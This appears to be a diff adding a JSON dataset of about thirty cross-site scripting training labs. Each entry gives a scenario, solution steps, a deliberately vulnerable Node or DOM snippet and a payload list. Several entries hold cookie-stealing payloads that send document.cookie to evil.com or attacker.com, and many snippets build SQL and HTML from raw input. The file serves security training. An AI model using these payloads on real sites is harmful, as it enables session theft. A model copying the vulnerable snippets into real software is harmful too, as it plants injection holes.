@@ -1,0 +1,558 @@
+[
+  {
+    "Lab scenario": "CMS Stored XSS in blog post title rendering",
+    "Lab Description": "This lab simulates a CMS where blog post titles are stored and displayed without sanitization. The application displays the post title directly in the HTML document title tag. To solve: Inject a JavaScript payload that executes when any user opens the blog post.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Use Burp Suite to intercept the blog post submission request.",
+      "Verify raw HTML output to confirm reflection in <title> tag.",
+      "Craft payload: <script>document.location='//evil.com?c='+document.cookie</script>",
+      "Submit as blog title and publish post.",
+      "Open post in a new session to trigger script."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/submit-post', (req, res) => {\n  let title = req.body.title;\n  db.query(`INSERT INTO posts (title) VALUES ('${title}')`);\n  res.redirect('/posts');\n});",
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
+    ]
+  },
+  {
+    "Lab scenario": "API gateway DOM-based XSS in error message handling",
+    "Lab Description": "This lab simulates a DOM-based XSS vulnerability in an API gateway's debug interface. Client-side JavaScript updates error messages dynamically using `innerHTML`. To solve: Exploit an error endpoint to inject a DOM-based XSS payload.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Use Postman to submit a malformed request to /api/debug?error=<payload>.",
+      "Confirm injection into error display area on UI.",
+      "Craft payload: <svg onload=alert(1)> for DOM execution.",
+      "Paste into API request and reload debug page.",
+      "Observe code execution without backend reflection."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('error-box').innerHTML = location.search.split('error=')[1];",
+    "payloads": [
+      "<svg onload=alert(1)>",
+      "<img src=x onerror=alert(document.domain)>"
+    ]
+  },
+  {
+    "Lab scenario": "IoT dashboard Mutation-based XSS via dynamic widget rename",
+    "Lab Description": "This lab mimics an IoT dashboard where widgets can be renamed inline. The application uses a mutation observer to react to DOM changes but fails to sanitize new content. To solve: Inject malicious content that gets executed when the dashboard mutates the DOM.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Inspect DOM widget element using browser dev tools.",
+      "Inject: <input value='</input><script>alert(1)</script>' /> into rename field.",
+      "Let the MutationObserver parse and append innerHTML.",
+      "Trigger mutation by saving renamed widget.",
+      "Observe payload execution."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "observer.observe(document.body, { childList: true, subtree: true });\nwidget.innerHTML = newName;",
+    "payloads": [
+      "<input autofocus onfocus=alert(1)>",
+      "</input><script>alert('MUTATION')</script>"
+    ]
+  },
+  {
+    "Lab scenario": "Banking portal Reflected XSS in HTTP error page",
+    "Lab Description": "This lab exposes a reflected XSS flaw in the 404 error page of a banking portal. The URL path is reflected into the error template without encoding. To solve: Inject a JavaScript payload in the URL that causes a popup when visiting a broken link.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Use OWASP ZAP to crawl URLs and identify dynamic error page.",
+      "Send payload in broken path: /thisdoesnotexist<script>alert(1)</script>",
+      "Observe reflected input in HTML without sanitization.",
+      "Confirm execution of payload on page load.",
+      "Try alternative payloads to avoid WAF."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.use((req, res) => {\n  res.status(404).send(`Page not found: ${req.url}`);\n});",
+    "payloads": [
+      "/<script>alert(1)</script>",
+      "/%3Cscript%3Ealert(1)%3C/script%3E"
+    ]
+  },
+  {
+    "Lab scenario": "CMS DOM-based XSS via live preview panel",
+    "Lab Description": "This lab simulates a WYSIWYG editor in a CMS where user content is shown in a live preview using `innerHTML`. The editor does not strip script tags before rendering. To solve: Inject a script that executes inside the live preview panel.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Open CMS editor and type: <script>alert(123)</script> in the body.",
+      "Check if the preview panel updates instantly via innerHTML.",
+      "Use browser dev tools to confirm DOM rendering.",
+      "Test bypasses like <img src=x onerror=alert(1)>",
+      "Trigger execution in preview panel context."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "preview.innerHTML = document.getElementById('editor-input').value;",
+    "payloads": [
+      "<script>alert(123)</script>",
+      "<img src=x onerror=alert(1)>"
+    ]
+  }
+,
+
+
+
+  {
+    "Lab scenario": "Healthcare portal Stored XSS in patient notes",
+    "Lab Description": "This lab mimics a hospital portal where doctors can save notes on patients. These notes are rendered in the admin dashboard without sanitization. The application stores the note input directly and renders it as HTML. To solve: Inject a script in the patient notes to trigger when an admin reviews them.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Login as a doctor and navigate to 'Add Notes' section.",
+      "Use Burp Suite to intercept the note submission request.",
+      "Inject payload: <script>new Image().src='//attacker.com?c='+document.cookie</script>",
+      "Save the note and log out.",
+      "Login as admin and open the patient profile to trigger XSS."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/add-note', (req, res) => {\n  let note = req.body.note;\n  db.query(`INSERT INTO notes (content) VALUES ('${note}')`);\n  res.send('Note saved');\n});",
+    "payloads": [
+      "<script>alert('doctor')</script>",
+      "<script>fetch('//evil.com?c='+document.cookie)</script>"
+    ]
+  },
+  {
+    "Lab scenario": "E-learning platform DOM-based XSS in quiz result summary",
+    "Lab Description": "This lab features a DOM-based XSS vulnerability where quiz scores are reflected on the result page without escaping. The application uses location.hash to read and write data via innerHTML. To solve: Inject a malicious script in the fragment that executes in the DOM context.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Navigate to the quiz results page and observe use of location.hash.",
+      "Craft a URL: /results.html#<img src=x onerror=alert('XSS')>",
+      "Paste it in the address bar and press Enter.",
+      "Observe execution of injected JavaScript in the browser.",
+      "Test alternative payloads to bypass possible filters."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('summary').innerHTML = location.hash.substring(1);",
+    "payloads": [
+      "#<img src=x onerror=alert('XSS')>",
+      "#<svg/onload=alert('HASH')>"
+    ]
+  },
+  {
+    "Lab scenario": "Online forum Reflected XSS in topic preview tooltip",
+    "Lab Description": "This lab simulates a forum where hovering over a topic shows a preview using query parameters. The content is not sanitized before insertion into an HTML attribute, leading to reflected XSS. To solve: Inject payload via URL to trigger alert on hover.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Use OWASP ZAP to find the preview endpoint: /topic/preview?text=",
+      "Inject payload: \" onmouseover=alert(1) x=\"",
+      "Load the page and hover over the preview tooltip.",
+      "Observe execution of JavaScript from the injected attribute.",
+      "Experiment with quotes and encoding variations."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.send(`<div title='${req.query.text}'>Topic</div>`);",
+    "payloads": [
+      "\" onmouseover=alert(1) x=\"",
+      "\"><script>alert(123)</script>"
+    ]
+  },
+  {
+    "Lab scenario": "Admin panel Stored XSS in system notification editor",
+    "Lab Description": "This lab contains a stored XSS vulnerability in a system where admins post internal notifications to all users. The input is saved and directly rendered on user dashboards. To solve: Inject a payload as an admin that triggers a script when a user logs in.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Login to the admin panel and create a new system message.",
+      "Inject payload: <iframe srcdoc=\"<script>alert('Notice')</script>\"></iframe>",
+      "Save the message and log out.",
+      "Login as a normal user and check the dashboard.",
+      "Verify script execution upon loading message."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "db.query(`INSERT INTO messages (body) VALUES ('${req.body.message}')`);",
+    "payloads": [
+      "<iframe srcdoc=\"<script>alert('Notice')</script>\"></iframe>",
+      "<script>alert('Stored')</script>"
+    ]
+  },
+  {
+    "Lab scenario": "IoT smart home DOM-based XSS in log viewer tab",
+    "Lab Description": "This lab simulates a smart home dashboard that shows device logs. Logs are appended to the DOM using `innerHTML` from localStorage, allowing injection. To solve: Inject a payload into localStorage and reload the page to trigger execution.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Open browser dev tools and navigate to localStorage.",
+      "Set: localStorage.setItem('logs', '<img src=x onerror=alert(\"XSS\")>');",
+      "Reload the dashboard and open log viewer tab.",
+      "Confirm DOM update via innerHTML causes script execution.",
+      "Try different storage-based XSS variations."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('log-output').innerHTML = localStorage.getItem('logs');",
+    "payloads": [
+      "<img src=x onerror=alert(\"XSS\")>",
+      "<script>alert('logs')</script>"
+    ]
+  }
+,
+
+  {
+    "Lab scenario": "Job portal Stored XSS in resume upload notes",
+    "Lab Description": "The application allows job seekers to upload resumes with optional notes. These notes are displayed to employers reviewing applications. However, the notes field is stored and rendered without sanitization. To solve: Inject a malicious script into the notes field to execute when the employer views it.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Register as a job seeker and go to resume upload form.",
+      "Intercept the POST request using Burp Suite.",
+      "Inject payload: <script>alert('CV XSS')</script> into the notes field.",
+      "Submit and log out.",
+      "Login as employer and view the resume, triggering the XSS."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/upload-resume', (req, res) => {\n  db.query(`INSERT INTO resumes (note) VALUES ('${req.body.note}')`);\n  res.send('Resume uploaded');\n});",
+    "payloads": [
+      "<script>alert('CV XSS')</script>",
+      "<img src=x onerror=alert('Resume')>"
+    ]
+  },
+  {
+    "Lab scenario": "Social media app Reflected XSS in image tag generator",
+    "Lab Description": "The app generates HTML <img> tags from user-provided image URLs and returns them in a preview. The input is not properly sanitized, and special characters can break out of the tag context. To solve: Inject JavaScript into the image URL parameter and force execution.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Use OWASP ZAP to discover the endpoint: /generate-tag?src=",
+      "Inject: x onerror=alert('XSS') into the src parameter.",
+      "Observe the image tag generated with your payload.",
+      "Trigger execution by previewing the image.",
+      "Verify XSS fires in the response HTML."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.send(`<img src='${req.query.src}' />`);",
+    "payloads": [
+      "x onerror=alert('XSS')",
+      "x' onerror='alert(1)"
+    ]
+  },
+  {
+    "Lab scenario": "Customer support platform Stored XSS in ticket subject field",
+    "Lab Description": "A support ticketing system logs user-submitted issues. The subject of the ticket is directly rendered in the admin panel without escaping, resulting in a stored XSS risk. To solve: Inject a script in the subject field to trigger on admin view.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Submit a new support ticket with subject: <script>alert('Ticket')</script>",
+      "Intercept with Burp Suite to confirm it was stored.",
+      "Login as support staff and check open tickets.",
+      "Observe script executes when the subject is rendered.",
+      "Test alternative payloads for filter bypass."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/submit-ticket', (req, res) => {\n  db.query(`INSERT INTO tickets (subject) VALUES ('${req.body.subject}')`);\n  res.redirect('/thanks');\n});",
+    "payloads": [
+      "<script>alert('Ticket')</script>",
+      "<svg/onload=alert('Support')>"
+    ]
+  },
+  {
+    "Lab scenario": "API documentation tool DOM-based XSS via hash injection",
+    "Lab Description": "A JavaScript-powered API doc site uses the URL fragment to display endpoint-specific documentation. The fragment is parsed and inserted into a div via innerHTML. This allows DOM-based XSS when a malicious hash value is used. To solve: Inject a payload into the hash and reload to trigger the XSS.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Navigate to /docs.html#intro",
+      "Replace fragment with: <img src=x onerror=alert('API')>",
+      "Observe innerHTML rendering the fragment as HTML.",
+      "Reload the page to confirm execution.",
+      "Try obfuscated versions to bypass encoding."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('content').innerHTML = decodeURIComponent(location.hash.slice(1));",
+    "payloads": [
+      "#<img src=x onerror=alert('API')>",
+      "#<svg/onload=alert('Docs')>"
+    ]
+  },
+  {
+    "Lab scenario": "CMS Mutation-based XSS via JavaScript content injection",
+    "Lab Description": "A custom CMS allows inline content editing and uses DOM mutation observers to re-parse user input. Malicious HTML with embedded event handlers is not sanitized before being reinjected. To solve: Use mutation-based injection to trigger execution during DOM parsing.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Login and go to content editor.",
+      "Insert: <a href='#' onclick='alert(123)'>Click</a> in the content block.",
+      "Save and reload to confirm it persists.",
+      "Check if the DOM mutates and re-evaluates handlers.",
+      "Use DevTools to confirm event execution on mutation."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "editor.on('save', content => {\n  document.querySelector('#preview').innerHTML = content;\n});\n\nconst observer = new MutationObserver(() => {\n  reRenderPreview();\n});\nobserver.observe(document.getElementById('preview'), {childList: true});",
+    "payloads": [
+      "<a href='#' onclick='alert(123)'>Click</a>",
+      "<iframe srcdoc='<script>alert(`CMS`)</script>'></iframe>"
+    ]
+  }
+,
+
+
+  {
+    "Lab scenario": "E-commerce dashboard Stored XSS in product review system",
+    "Lab Description": "The application allows users to leave product reviews, which are rendered on product pages. The review text is not sanitized or escaped before rendering. To solve: Inject a stored XSS payload into a review and trigger it on page load.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Write a review for any product with: <script>alert('Review XSS')</script>",
+      "Use Burp Suite to confirm the review is stored in the database.",
+      "Reload the product page to trigger the payload.",
+      "Test different review lengths and payload placements.",
+      "Attempt DOM injection with additional tags like <svg>."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/submit-review', (req, res) => {\n  db.query(`INSERT INTO reviews (content) VALUES ('${req.body.content}')`);\n  res.redirect('/product?id=' + req.body.product_id);\n});",
+    "payloads": [
+      "<script>alert('Review XSS')</script>",
+      "<svg/onload=alert(1)>"
+    ]
+  },
+  {
+    "Lab scenario": "Forum platform Reflected XSS in search suggestion API",
+    "Lab Description": "The forum uses a live search suggestion endpoint that echoes input directly into a JavaScript-rendered dropdown. No escaping is done on the reflected value. To solve: Inject a script payload into the search box and trigger execution through the live results.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Type <script>alert('XSS')</script> in the search box.",
+      "Use OWASP ZAP to intercept and replay the request.",
+      "Observe the dropdown HTML response in the developer console.",
+      "Trigger the JavaScript execution on hover or suggestion click.",
+      "Craft alternative payloads for bypassing character restrictions."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.send(`<ul><li>${req.query.q}</li></ul>`);",
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<img src=1 onerror=alert(1)>"
+    ]
+  },
+  {
+    "Lab scenario": "IoT dashboard DOM-based XSS in device label field",
+    "Lab Description": "An IoT device management panel allows setting custom labels for devices. These labels are read from `localStorage` and rendered using `innerHTML` in the dashboard. There's no sanitization before rendering, leading to DOM-based XSS. To solve: Inject a payload into localStorage and reload the page.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Open DevTools and set localStorage.deviceLabel = '<img src=x onerror=alert(1)>'",
+      "Reload the page and inspect how labels are inserted into the DOM.",
+      "Observe execution of the payload on dashboard load.",
+      "Modify payloads to exploit event-based triggers like onmouseover.",
+      "Try using different tag wrappers to bypass rendering filters."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('label').innerHTML = localStorage.deviceLabel;",
+    "payloads": [
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert('IoT')>"
+    ]
+  },
+  {
+    "Lab scenario": "Online invoice app Reflected XSS via PDF generation name field",
+    "Lab Description": "The invoice generator embeds user input directly into an HTML-based invoice that is rendered then converted into a PDF. No sanitization is applied before rendering. To solve: Inject a script that executes during the preview phase of invoice generation.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Submit invoice form with customer name: <script>alert('PDF')</script>",
+      "Intercept request and preview the rendered invoice page.",
+      "Observe script execution in the preview before PDF rendering.",
+      "Try injecting into other fields like company or address.",
+      "Check PDF output if script is embedded or executed."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.send(`<div>Customer: ${req.body.name}</div>`);",
+    "payloads": [
+      "<script>alert('PDF')</script>",
+      "<img src=x onerror=alert('Invoice')>"
+    ]
+  },
+  {
+    "Lab scenario": "Chat widget DOM-based XSS via dynamic welcome message",
+    "Lab Description": "A customer support chat widget includes a dynamic welcome message based on the current user. This message is inserted using `innerHTML` from a URL query param. There's no sanitization, enabling DOM-based XSS. To solve: Craft a URL with a payload in the query parameter and trigger the widget.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Visit: /chat?user=<img src=x onerror=alert('Chat')>",
+      "Confirm execution of the payload on widget render.",
+      "Inspect how the script is added into the DOM.",
+      "Try different encoded variants to evade basic filters.",
+      "Ensure the payload executes without user interaction."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const name = new URLSearchParams(location.search).get('user');\ndocument.getElementById('welcome').innerHTML = `Hello, ${name}`;",
+    "payloads": [
+      "<img src=x onerror=alert('Chat')>",
+      "<svg onload=alert('XSS')>"
+    ]
+  }
+,
+
+
+  {
+    "Lab scenario": "CMS plugin Stored XSS in article tags",
+    "Lab Description": "A content management system allows contributors to tag articles with arbitrary labels. These tags are rendered without sanitization on the article view page. To solve: Inject a script as a tag and verify it executes when the article is opened.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Login as a contributor and navigate to 'Create Article'.",
+      "Add a tag such as <script>alert('TagXSS')</script>.",
+      "Save and publish the article.",
+      "Open the article view page and observe execution.",
+      "Try alternate injection methods via hidden iframes."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "article.tags.forEach(tag => {\n  html += `<span class='tag'>${tag}</span>`;\n});",
+    "payloads": [
+      "<script>alert('TagXSS')</script>",
+      "<img src=1 onerror=alert('XSS')>"
+    ]
+  },
+  {
+    "Lab scenario": "Blog engine Reflected XSS in 404 error message",
+    "Lab Description": "The blog's custom 404 page reflects the requested URL path directly into the error page without encoding. This allows attackers to inject scripts into the error message display. To solve: Craft a malicious URL path that triggers script execution on error.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Visit a non-existent page like /<script>alert(404)</script>",
+      "Observe if the script executes on the 404 error page.",
+      "Use OWASP ZAP to replay the request with different payloads.",
+      "Try encoded payloads to bypass filters.",
+      "Validate execution across different browsers."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.status(404).send(`<h1>404 Not Found: ${req.url}</h1>`);",
+    "payloads": [
+      "<script>alert(404)</script>",
+      "<img src=x onerror=alert('404XSS')>"
+    ]
+  },
+  {
+    "Lab scenario": "Analytics dashboard DOM-based XSS via chart titles",
+    "Lab Description": "The dashboard lets users create custom charts and label them with titles stored in `sessionStorage`. These are later rendered with innerHTML for display without validation. To solve: Inject a payload into `sessionStorage` and reload the page to trigger.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Open DevTools console and run: sessionStorage.setItem('title', '<svg onload=alert(1)>')",
+      "Reload the page and watch for execution.",
+      "Analyze the script location and injection point in the DOM.",
+      "Try nesting payloads in <style> or <marquee> for obfuscation.",
+      "Ensure it triggers across sessions if persisted."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('chart-title').innerHTML = sessionStorage.getItem('title');",
+    "payloads": [
+      "<svg onload=alert(1)>",
+      "<img src=x onerror=alert('ChartXSS')>"
+    ]
+  },
+  {
+    "Lab scenario": "Event registration app Mutation-based XSS in live form preview",
+    "Lab Description": "The registration app provides a live preview of custom HTML invitations. The preview renderer mutates and appends the user's raw HTML input, enabling event-based script injection. To solve: Inject a script via onmouseover or onclick and observe execution in the preview.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Type <a href='#' onmouseover=alert('XSS')>Hover me</a> into the form field.",
+      "Observe the preview update in real time with your content.",
+      "Trigger the event by hovering over the rendered element.",
+      "Try injecting <img> tags with onerror attributes.",
+      "Check for script execution on mobile vs. desktop."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "previewBox.innerHTML += `<div>${userInput}</div>`;",
+    "payloads": [
+      "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
+      "<img src=x onerror=alert('PreviewXSS')>"
+    ]
+  },
+  {
+    "Lab scenario": "Job board Reflected XSS via email contact form",
+    "Lab Description": "A job posting site includes a contact form that displays submitted data back to the user in a confirmation message. The name field is reflected into the DOM without escaping. To solve: Inject XSS payloads into the name input and submit the form.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Enter <script>alert('XSS')</script> in the name field.",
+      "Submit the contact form.",
+      "Observe the confirmation page with your payload reflected.",
+      "Use Burp Suite to test for different input vector combinations.",
+      "Try encoded payloads like %3Cscript%3E to bypass restrictions."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.send(`<div>Thank you, ${req.body.name}, we will be in touch.</div>`);",
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<svg onload=alert('JobXSS')>"
+    ]
+  }
+,
+
+
+  {
+    "Lab scenario": "Support ticket system Stored XSS in issue title",
+    "Lab Description": "The support system allows users to submit tickets with custom titles. These titles are rendered on the admin dashboard without sanitization. To solve: Inject an XSS payload in the title field and trigger execution when viewed by an admin.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Login as a normal user and submit a new support ticket.",
+      "In the 'Title' field, use: <script>alert('AdminXSS')</script>",
+      "Log out and login as admin to review tickets.",
+      "Observe the execution when the ticket title loads.",
+      "Test obfuscated payloads to bypass WAF."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.send(`<div class='ticket-title'>${ticket.title}</div>`);",
+    "payloads": [
+      "<script>alert('AdminXSS')</script>",
+      "<img src=x onerror=alert('XSS')>"
+    ]
+  },
+  {
+    "Lab scenario": "IoT dashboard DOM-based XSS in log viewer",
+    "Lab Description": "The IoT device dashboard pulls log messages from local storage and renders them using `innerHTML`. Malicious content injected into localStorage can lead to XSS. To solve: Store a malicious payload in localStorage and reload the logs view.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Open browser DevTools and set: localStorage.setItem('log', '<img src=x onerror=alert(1337)>');",
+      "Refresh the logs view page.",
+      "Check if the image payload gets executed.",
+      "Try nesting payloads inside malformed HTML.",
+      "Analyze browser console for CSP-related messages."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('logs').innerHTML = localStorage.getItem('log');",
+    "payloads": [
+      "<img src=x onerror=alert(1337)>",
+      "<svg/onload=alert(1)>"
+    ]
+  },
+  {
+    "Lab scenario": "Online quiz app Reflected XSS in question preview",
+    "Lab Description": "Instructors can preview custom questions by appending content to a preview URL. The question content is reflected into the HTML without escaping. To solve: Inject a payload into the question text parameter and confirm execution.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Access /preview?question=<script>alert('XSS')</script>",
+      "Observe execution in the question preview page.",
+      "Use Burp to test with URL-encoded payloads.",
+      "Try payloads using SVG or iframes.",
+      "Confirm if the payload is executed without authentication."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "res.send(`<div class='preview'>${req.query.question}</div>`);",
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<iframe src='javascript:alert(1)'></iframe>"
+    ]
+  },
+  {
+    "Lab scenario": "E-commerce product manager Stored XSS in custom attributes",
+    "Lab Description": "Vendors can add custom HTML attributes to product cards, which are rendered in the admin dashboard. These attributes aren't sanitized, allowing script injection. To solve: Inject JavaScript into a custom attribute and trigger execution when viewed.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "As a vendor, go to 'Add Product'.",
+      "Set a custom attribute like: onmouseover=alert('XSS')",
+      "Save and open the admin dashboard.",
+      "Hover over the affected product card.",
+      "Try chaining multiple events for evasion."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "<div class='product-card' ${customAttributes}></div>",
+    "payloads": [
+      "onmouseover=alert('XSS')",
+      "onerror=alert('AttrXSS')"
+    ]
+  },
+  {
+    "Lab scenario": "Marketing email preview Mutation-based XSS in dynamic editor",
+    "Lab Description": "The dynamic email editor allows marketing staff to preview raw HTML email content. The content is rendered with `innerHTML`, allowing injected payloads to mutate the DOM. To solve: Inject a script via onerror or <svg> and observe execution in preview.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Insert <svg onload=alert('XSS')> in the HTML content.",
+      "Click on 'Preview Email' and observe the output.",
+      "Try different tags like <body onload=...>.",
+      "Use the DevTools console to monitor mutations.",
+      "Check if preview is persisted and accessible by others."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('email-preview').innerHTML = emailContent;",
+    "payloads": [
+      "<svg onload=alert('XSS')>",
+      "<body onload=alert('PreviewXSS')>"
+    ]
+  }
+]
+
